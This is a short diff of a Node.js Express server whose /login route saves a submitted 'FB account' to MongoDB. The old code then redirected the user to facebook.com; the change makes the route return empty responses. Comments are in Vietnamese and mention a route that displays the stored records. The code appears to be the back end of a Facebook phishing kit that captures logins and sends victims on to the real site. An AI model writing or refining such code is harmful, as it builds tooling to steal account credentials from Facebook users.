@@ -57,10 +57,10 @@ app.post('/login', async (req, res) => {
         await newFB.save();
 
         // Chuyển hướng đến trang facebook.com sau khi đăng ký thành công
-        res.redirect('https://www.facebook.com');
+           res.status(201).end(); // Không trả về message
     } catch (error) {
         console.error(error);
-        res.status(500).send('An error occurred while saving the FB account.');
+        res.status(500).end(); // Không trả về message
     }
 });
 // Route để lấy dữ liệu từ MongoDB và hiển thị lên trang web
